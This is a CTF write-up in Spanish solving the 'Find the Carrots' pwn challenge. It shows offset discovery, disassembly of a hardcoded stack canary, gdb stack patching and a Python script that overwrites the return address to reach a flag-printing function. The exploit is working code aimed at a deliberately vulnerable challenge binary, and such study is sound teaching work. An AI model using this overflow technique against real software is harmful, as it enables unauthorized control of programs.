## **Enunciado**
Find the Carrots  
Points: 300   
Country: Mexico   
Attatchment: https://mega.nz/#!twM1nYCA!qXDWql7ER6gLYj6eaT7iG-12sFdH3ozePk0VDl_xLwk   
Description: We all know that rabbits' favorite food is carrots. Help the rabbits to eat their favorite food today and be careful with the birds...good luck!   

## **Solución**

Se trata del clásico buffer overflow que peta cuando le metes más caracteres de los debidos:

```
./carrots 
 Where is my carrot?
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Segmentation fault
```
Veamos las protecciones que tiene el binario:

```
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Sólo tiene habilitado la no ejecucción en la pila, vamos a crear un patrón de caracteres para averiguar el offset con metasploit:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Lo metemos en gdb y nos da una dirección que se corresponde con una parte del patrón anteior. Esta dirección se la pasamos a metasploit otra vez y nos da el offset:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 0x37654136
[*] Exact match at offset 140
```

Si nos fijamos en la función main vemos que hay una llamada a la función que recoge nuestros datos por consola, esta función es vulnerable a un buffer overflow. Si metemos más de 140 caracteres vamos a sobreescribir el stack frame de main.

```
 08049790 <main>:
 8049790:	55                   	push   ebp
 8049791:	89 e5                	mov    ebp,esp
 8049793:	81 ec a8 00 00 00    	sub    esp,0xa8
 8049799:	c7 45 fc 44 52 49 42 	mov    DWORD PTR [ebp-0x4],0x42495244
 80497a0:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [ebp-0x8],0x0
 80497a7:	e8 64 fa ff ff       	call   8049210 <_Z6bannerv>             <== Pinta el dibujito
 80497ac:	8d 05 4a a0 04 08    	lea    eax,ds:0x804a04a
 80497b2:	89 04 24             	mov    DWORD PTR [esp],eax
 80497b5:	e8 a6 f7 ff ff       	call   8048f60 <printf@plt>             <== Muestra la pregunta por pantalla
 80497ba:	8d 0d a0 c0 04 08    	lea    ecx,ds:0x804c0a0
 80497c0:	8d 95 78 ff ff ff    	lea    edx,[ebp-0x88]
 80497c6:	89 0c 24             	mov    DWORD PTR [esp],ecx
 80497c9:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80497cd:	89 85 74 ff ff ff    	mov    DWORD PTR [ebp-0x8c],eax
 80497d3:	e8 c8 f7 ff ff       	call   8048fa0                          <== Función vulnerable que recoge los datos introducidos
 80497d8:	81 7d f8 00 00 00 00 	cmp    DWORD PTR [ebp-0x8],0x0
 80497df:	89 85 70 ff ff ff    	mov    DWORD PTR [ebp-0x90],eax
 80497e5:	0f 85 14 00 00 00    	jne    80497ff <main+0x6f>
 80497eb:	31 c0                	xor    eax,eax
 80497ed:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80497f4:	89 85 6c ff ff ff    	mov    DWORD PTR [ebp-0x94],eax
 80497fa:	e8 a1 f8 ff ff       	call   80490a0 <exit@plt>
 80497ff:	31 c0                	xor    eax,eax
 8049801:	8b 4d f8             	mov    ecx,DWORD PTR [ebp-0x8]          
 8049804:	89 0d d0 c1 04 08    	mov    DWORD PTR ds:0x804c1d0,ecx    
 804980a:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 804980d:	89 0d d4 c1 04 08    	mov    DWORD PTR ds:0x804c1d4,ecx
 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]
 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx
 804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
 8049822:	5d                   	pop    ebp
 8049823:	c3                   	ret                                     <== Sobreescribir aquí el EIP antes de llamar a ret

```
Situación de la pila después de la llamada a la función y tras haber introducido 140 caracteres, los últimos 4 caracteres son diferentes para identificar donde está la posición de memoria de retorno que hemos machacado:

```
br *0x80497d8
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

gdb-peda$ x/64xw $esp
0xbffff290:	0x0804c0a0	0xbffff33c	0xb7dbfe00	0xb7dbfdfc
0xbffff2a0:	0xb7fac504	0xb7c13618	0xb7c3a870	0x00000018
0xbffff2b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff2c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff2d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff2e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff2f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff300:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff310:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff320:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff330:	0x41414141	0x41414141	0x42424242	0xb7c24200
```

Una vez que sabemos que si introducimos 140 caracteres va a sobreescribir el EIP del stack frame de main, si metemos 136 caracteres y una dirección de memoria donde dirigir el flujo del programa (posición ocupada por BBBB y cuyo valor es 0xbffff33c). Lo suyo sería dirigir el programa hacia una dirección donde nos muestre el flag que buscamos, pero... ¿cual es esa dirección de memoria?
Si echamos un vistazo a las strings, vemos que hay unas cadenas que podrían darnos una pista de donde va a mostrarnos el flag:

```
rabin2 -z carrots | grep arrot
vaddr=0x08049fd5 paddr=0x00001fd5 ordinal=018 sz=38 len=37 section=.rodata type=ascii string=\n Yes! My Carrot is here! mmmm ... \n 
```

Buscando en el código encontramos la función desde la que se llama a esa string:

```
objdump -M intel -drw carrots | grep 49fd5 -6
08049570 <_Z6CARROTv>:
 8049570:	55                   	push   ebp
 8049571:	89 e5                	mov    ebp,esp
 8049573:	53                   	push   ebx
 8049574:	56                   	push   esi
 8049575:	81 ec 90 00 00 00    	sub    esp,0x90
 804957b:	8d 05 d5 9f 04 08    	lea    eax,ds:0x8049fd5          <== Dirección de la string que buscamos con el grep
 8049581:	89 04 24             	mov    DWORD PTR [esp],eax
 8049584:	e8 d7 f9 ff ff       	call   8048f60 <printf@plt>
 8049589:	81 3d d4 c1 04 08 44 52 49 42 	cmp    DWORD PTR ds:0x804c1d4,0x42495244
 8049593:	89 45 a8             	mov    DWORD PTR [ebp-0x58],eax
 8049596:	0f 84 22 00 00 00    	je     80495be <_Z6CARROTv+0x4e>
 804959c:	8d 05 fb 9f 04 08    	lea    eax,ds:0x8049ffb

```

Nuestra función objetivo es "_Z6CARROTv", sólo nos queda apuntar el EIP a 0x08049570. Si lo probamos dentro del gdb, hay que cambiar las BBBB  que está en la posición 0xbffff33c por el valor 0x08049570:

```
set {int}0xbffff33c=0x08049570
```
```
gdb-peda$ c
Continuing.

 Yes! My Carrot is here! mmmm ... 
  ~(‾▿‾)~   Oh NO! We hate birds :( 
```

Ooops! Something is wrong here. ¿Qué ha pasado? Parece que no era tan fácil como parecía. Echemos un vistazo a la función "_Z6CARROTv" a ver si encontramos algo:

```
 8049575:	81 ec 90 00 00 00    	sub    esp,0x90
 804957b:	8d 05 d5 9f 04 08    	lea    eax,ds:0x8049fd5
 8049581:	89 04 24             	mov    DWORD PTR [esp],eax
 8049584:	e8 d7 f9 ff ff       	call   8048f60 <printf@plt>
 8049589:	81 3d d4 c1 04 08 44 52 49 42 	cmp    DWORD PTR ds:0x804c1d4,0x42495244    <= Compara el contenido de una posición de memoria con el valor 0x42495244
 8049593:	89 45 a8             	mov    DWORD PTR [ebp-0x58],eax
 8049596:	0f 84 22 00 00 00    	je     80495be <_Z6CARROTv+0x4e>
 804959c:	8d 05 fb 9f 04 08    	lea    eax,ds:0x8049ffb
 80495a2:	89 04 24             	mov    DWORD PTR [esp],eax
 80495a5:	e8 b6 f9 ff ff       	call   8048f60 <printf@plt>
 80495aa:	31 c9                	xor    ecx,ecx
 80495ac:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80495b3:	89 45 a4             	mov    DWORD PTR [ebp-0x5c],eax
 80495b6:	89 4d a0             	mov    DWORD PTR [ebp-0x60],ecx
 80495b9:	e8 e2 fa ff ff       	call   80490a0 <exit@plt>
 80495be:	a1 d8 c1 04 08       	mov    eax,ds:0x804c1d8
```

Tenemos una comparación entre el valor 0x42495244 (que en ASCII es 'BIRD", ¡son unos cachondos dando pistas!)  y la posición de memoria 0x804c1d4, que es la variable 'c1' y contiene lo siguiente:

```
x/32xw 0x804c1d4
0x804c1d4 <c1>:	0x41414141	0xb7c24200	0x00000000	0x00000000
```

Mmm... no creo que sea casualidad que haya 'AAAA' en esa posición de memoria. Sospecho que en la función main guarda un valor en esa posición de memoria para asegurarse que nadie modifica la pila. Lo que se conoce como el canary stack, pero debe ser un canary hardcodeado en el propio código porque antes hemos visto que no estaba habilitado esa protección en el binario. Volvamos a la función main y veamos cuando guarda ese valor y como podemos saltarnos el canary hardcodeado:

```
 08049790 <main>:
 8049790:	55                   	push   ebp
 8049791:	89 e5                	mov    ebp,esp
 8049793:	81 ec a8 00 00 00    	sub    esp,0xa8
 8049799:	c7 45 fc 44 52 49 42 	mov    DWORD PTR [ebp-0x4],0x42495244  <== Guarda como valor local(var_4) el valor hardcodeado del canary
 80497a0:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [ebp-0x8],0x0         <== Guarda un 0 en la variable local var_8
 ...........
 80497cd:	89 85 74 ff ff ff    	mov    DWORD PTR [ebp-0x8c],eax
 80497d3:	e8 c8 f7 ff ff       	call   8048fa0                          <== Función vulnerable que recoge los datos introducidos
 80497d8:	81 7d f8 00 00 00 00 	cmp    DWORD PTR [ebp-0x8],0x0          <== Comprueba si ha habido algún error en la llamada a la función
 80497df:	89 85 70 ff ff ff    	mov    DWORD PTR [ebp-0x90],eax
 80497e5:	0f 85 14 00 00 00    	jne    80497ff <main+0x6f>              <== Si hay un error ($eax<>0) sigue y sale del programa
 80497eb:	31 c0                	xor    eax,eax
 80497ed:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80497f4:	89 85 6c ff ff ff    	mov    DWORD PTR [ebp-0x94],eax
 80497fa:	e8 a1 f8 ff ff       	call   80490a0 <exit@plt>
 80497ff:	31 c0                	xor    eax,eax                         <== Sigue por aquí si no ha habido un error
 8049801:	8b 4d f8             	mov    ecx,DWORD PTR [ebp-0x8]         <== Recupera el valor de var_8   
 8049804:	89 0d d0 c1 04 08    	mov    DWORD PTR ds:0x804c1d0,ecx      <== Guarda var_8 en la posición 0x804c1d0
 804980a:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]         <== Recupera el valor del canary hardcodeado guardado en var_4
 804980d:	89 0d d4 c1 04 08    	mov    DWORD PTR ds:0x804c1d4,ecx      <== Guarda el valor hardcodeado en la posición 0x804c1d4
 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]         <== Recupera un valor del stack frame previo
 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx      <== Guarda el valor anterior en la posición 0x804c1d8
 804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
 8049822:	5d                   	pop    ebp
 8049823:	c3                   	ret                                   
```

Si observamos la pila antes de meter el offset en nuestra función de recogida de datos tenemos los siguientes valores:

```
x/32xw $ebp-0x4
0xbffff334:	0x42495244	0x00000000	0xb7c24276	0x00000001
```

Si la observamos después de meter el offset de 140 caracteres, se puede comprobar que hemos machadado tres valores que guarda en memoria y que luego va a usar para saber si hemos modificado la pila:

```
gdb-peda$ x/32xw $ebp-0x4
0xbffff334:	0x41414141	0x42424242	0xb7c24200	0x00000001
```

Ok, entonces no solo tenemos que poner la dirección donde queremos enviar el flujo del programa además debemos mantener esos valores para que no nos dé el error anterior. Para eso cambiamos los valores en gdb para evitar el canary:

```
set {int}0xbffff334=0x42495244
set {int}0xbffff338=0x00000000
set {int}0xbffff33c=0x08049570
```

Si seguimos la ejeucción del programa dentro del gdb nos da lo siguiente:

```
Yes! My Carrot is here! mmmm ... 
fwhibbit{Carrots_for_All_dabd8800}
```

Ya tenemos el flag, pero si lo introducimos en el panel del CTF nos dice que no es correcto. WTF!!!!    
Aquí es donde me ofusque con este reto y empecé a hacer todo tipo de pruebas dentro de gdb para ver porque esa no era el flag correcto. Después de medio día perdido volviendome loco y gracias a un admin del CTF al que pregunté y me dijo que no tenía que hacer el reversing del binario sino que tenía que explotarlo. Fue entonces cuando entendí que tenía que ejecutar el exploit fuera del gdb porque los últimos valores del flag(dabd8800) eran el valor de una posición de memoria. Y cuando ejecutas el programa para debugearlo esas posiciones son diferentes a cuando lo haces directamente sobre el sistema. Por lo tanto hice mi cutre script en python y así conseguí explotar el programa. :-)

```python
#!/usr/bin/python
# Fichero explotalo.py 
# Exploit ROP


from struct import pack

binary = "carrots"
junk = "A" * 132

rop = pack('<I', 0x42495244)   
rop += pack('<I', 0x00000000)    
rop += pack('<I', 0x08049570)   


payload = junk + rop 
print payload
```

Por fin la solución final:

```
root@LOL:~/fwhibbitCTF/pwn# python explotalo.py > file.txt 
root@LOL:~/fwhibbitCTF/pwn# ./carrots < file.txt 

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 Where is my carrot?
 > 
 Yes! My Carrot is here! mmmm ... 
 fwhibbit{Carrots_for_All_160591c0}
Segmentation fault
```


